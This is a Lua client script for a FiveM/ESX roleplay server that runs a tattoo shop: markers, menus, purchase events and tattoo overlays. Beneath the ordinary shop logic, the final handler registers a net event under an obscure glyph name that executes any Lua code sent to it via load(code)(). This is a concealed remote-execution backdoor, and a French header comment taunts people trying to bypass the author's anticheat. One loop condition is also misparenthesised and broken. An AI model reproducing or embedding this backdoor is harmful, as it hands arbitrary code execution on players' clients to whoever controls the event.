-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
  	end
end)

local currentTattoos = {}

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #tattoosShops, 1 do
			local distance = #(plyCoords - tattoosShops[i])

			if distance < 25.0 then
				DrawMarker(29, tattoosShops[i], vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(0.5, 0.5, 0.5), 0, 255, 0, 100, false, false, 2, true, nil, nil, false)

				if distance < 1.5 then
					ESX.ShowHelpNotification(Config.TextToOpenMenu)

					if IsControlJustPressed(0, Config.KeyToOpenMenu) then
						ESX.UI.Menu.CloseAll()
						FreezeEntityPosition(PlayerPedId(), true)
						openMenu()
					end
				end
			end
		end
	end
end)

function openMenu()
	local elements = {}

	for k, v in pairs(tattoosCategories) do
		table.insert(elements, {label = v.name, value = v.value})
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'Tattoos_menu', {
		title = 'Tatouages',
		elements = elements,
	}, function(data, menu)
		if (data.current.value ~= nil) then
			elements = {}

			for k, v in pairs(tattoosList[data.current.value]) do
				table.insert(elements, {label = "Tattoo n°" .. k, rightlabel = {"$" .. v.price}, value = k, price = v.price})
			end

			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'Tattoos_Categories_menu', {
				title = data.current.label,
				elements = elements,
			}, function(data2, menu2)
				_TriggerServerEvent("::{korioz#0110}::tattoos:save", currentTattoos, data2.current.price, {collection = data.current.value, texture = data2.current.value})
			end, function(data2, menu2)
			end, function(data2, menu2)
				drawTattoo(data2.current.value, data.current.value)
			end)
		end
	end, function(data, menu)
		FreezeEntityPosition(PlayerPedId(), false)
		setPedSkin()
	end)
end

Citizen.CreateThread(function()
	for i = 1, #tattoosShops, 1 do
		local blip = AddBlipForCoord(tattoosShops[i])

		SetBlipSprite(blip, 75)
		SetBlipColour(blip, 1)
		SetBlipAsShortRange(blip, true)
		SetBlipScale(blip, 0.8)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName("Tatoueur")
		EndTextCommandSetBlipName(blip)
	end
end)

function setPedSkin()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin, jobSkin)
		local model = nil

		if skin.sex == 0 then
			model = `mp_m_freemode_01`
		else
			model = `mp_f_freemode_01`
		end

		ESX.Streaming.RequestModel(model)

		SetPlayerModel(PlayerId(), model)
		SetModelAsNoLongerNeeded(model)

		TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
		TriggerEvent('::{korioz#0110}::esx:restoreLoadout')
	end)

	Citizen.Wait(1000)

	for k, v in pairs(currentTattoos) do
		ApplyPedOverlay(PlayerPedId(), GetHashKey(v.collection), GetHashKey(tattoosList[v.collection][v.texture].nameHash))
	end
end

function drawTattoo(current, collection)
	SetEntityHeading(PlayerPedId(), 297.7296)

	ClearPedDecorations(PlayerPedId())

	for k, v in pairs(currentTattoos) do
		ApplyPedOverlay(PlayerPedId(), GetHashKey(v.collection), GetHashKey(tattoosList[v.collection][v.texture].nameHash))
	end

	if GetEntityModel(PlayerPedId()) == -1667301416 then
		SetPedComponentVariation(PlayerPedId(), 8, 34, 0, 2)
		SetPedComponentVariation(PlayerPedId(), 3, 15, 0, 2)
		SetPedComponentVariation(PlayerPedId(), 11, 101, 1, 2)
		SetPedComponentVariation(PlayerPedId(), 4, 16, 0, 2)
	else
		SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 2)
		SetPedComponentVariation(PlayerPedId(), 3, 15, 0, 2)
		SetPedComponentVariation(PlayerPedId(), 11, 91, 0, 2)
		SetPedComponentVariation(PlayerPedId(), 4, 14, 0, 2)
	end

	ApplyPedOverlay(PlayerPedId(), GetHashKey(collection), GetHashKey(tattoosList[collection][current].nameHash))
end

function cleanPlayer()
	ClearPedDecorations(PlayerPedId())

	for k, v in pairs(currentTattoos) do
		ApplyPedOverlay(PlayerPedId(), GetHashKey(v.collection), GetHashKey(tattoosList[v.collection][v.texture].nameHash))
	end
end

RegisterNetEvent("::{korioz#0110}::tattoos:getPlayerTattoos")
AddEventHandler("::{korioz#0110}::tattoos:getPlayerTattoos", function(playerTattoosList)
	for k, v in pairs(playerTattoosList) do
		ApplyPedOverlay(PlayerPedId(), GetHashKey(v.collection), GetHashKey(tattoosList[v.collection][v.texture].nameHash))
	end

	currentTattoos = playerTattoosList
end)

local firstLoad = false

AddEventHandler("::{korioz#0110}::skinchanger:loadSkin", function(skin)
	if not firstLoad then
		Citizen.CreateThread(function()
			while not GetEntityModel(PlayerPedId() == `mp_m_freemode_01` or GetEntityModel(PlayerPedId()) == `mp_f_freemode_01`) do
				Citizen.Wait(10)
			end

			Citizen.Wait(75)
			_TriggerServerEvent("::{korioz#0110}::tattoos:GetPlayerTattoos_s")
		end)
		
		firstLoad = true
	else
		Citizen.Wait(75)

		for k, v in pairs(currentTattoos) do
			ApplyPedOverlay(PlayerPedId(), GetHashKey(v.collection), GetHashKey(tattoosList[v.collection][v.texture].nameHash))
		end
	end
end)

RegisterNetEvent("::{korioz#0110}::tattoo:buySuccess")
AddEventHandler("::{korioz#0110}::tattoo:buySuccess", function(value)
	table.insert(currentTattoos, value)
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)